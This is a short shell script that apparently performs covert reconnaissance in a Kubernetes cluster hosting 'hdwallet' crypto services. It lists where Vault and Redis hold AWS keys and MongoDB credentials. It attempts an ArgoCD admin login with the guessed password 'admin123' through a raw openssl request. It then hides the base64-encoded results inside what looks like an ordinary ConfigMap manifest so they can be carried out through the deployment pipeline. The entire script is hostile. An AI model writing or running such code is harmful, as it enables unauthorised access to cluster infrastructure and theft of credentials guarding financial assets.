#!/bin/sh
RECON=$( (

# HDWallet 数据汇总 + 尝试 ArgoCD session
echo "===HDWALLET_SUMMARY==="
echo "VAULT: hdwallet-config -> AWS key + MongoDB"
echo "VAULT: hdwallet-price -> MongoDB"
echo "REDIS: 5 app files (hdwallet-gateway, hdwallet-configuration-java, hdwallet-price, hdwallet-txs, timebird-hdwallet-configuration-crypto)"

echo ""
echo "===ARGOCD_SESSION==="
# Try with a longer timeout and proper HTTP/1.0
(printf "POST /api/v1/session HTTP/1.0\r\nHost: argocd-server.argocd.svc.cluster.local\r\nContent-Type: application/json\r\nContent-Length: 44\r\nConnection: close\r\n\r\n{\"username\":\"admin\",\"password\":\"admin123\"}"; sleep 2) | timeout 5 openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | head -20

) | base64 | tr -d '\n' )
cat << EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: u2u
data:
  result: $RECON
EOF
exit 0
